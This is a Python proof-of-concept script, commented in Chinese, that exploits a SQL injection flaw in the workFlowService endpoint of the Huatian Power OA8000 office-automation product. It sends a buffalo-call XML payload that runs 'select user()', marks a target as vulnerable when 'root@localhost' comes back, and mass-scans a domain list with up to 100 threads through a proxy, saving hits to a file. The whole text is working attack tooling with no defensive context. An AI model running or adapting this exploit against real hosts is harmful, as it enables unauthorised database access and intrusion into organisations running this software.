# 华天动力OA8000版 workFlowService SQL注入漏洞
# 作者 charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "Accept-Encoding": "identity",
    "Accept-Language": "zh-CN,zh;q=0.8",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0"
}

post = '''<buffalo-call><method>getDataListForTree</method><string>select user()</string></buffalo-call>'''

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, post, headers, proxies):
    try:
        s = ""
        poc = "/OAapp/bfapp/buffalo/workFlowService"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.post(urldata, data=str(post), headers=headers, proxies=proxies, verify=False)
        s += url
        if re.text.find("root@localhost") >= 0:
            print("[+]存在漏洞", url)
            with open("D:\\code\\python\\exp\\华天动力OA8000版\\result.txt", "a", encoding="utf-8") as f:
                f.write(s)
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\华天动力OA8000版\\domain.txt") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, post, headers, proxies)).start()
        else:
            sleep(1)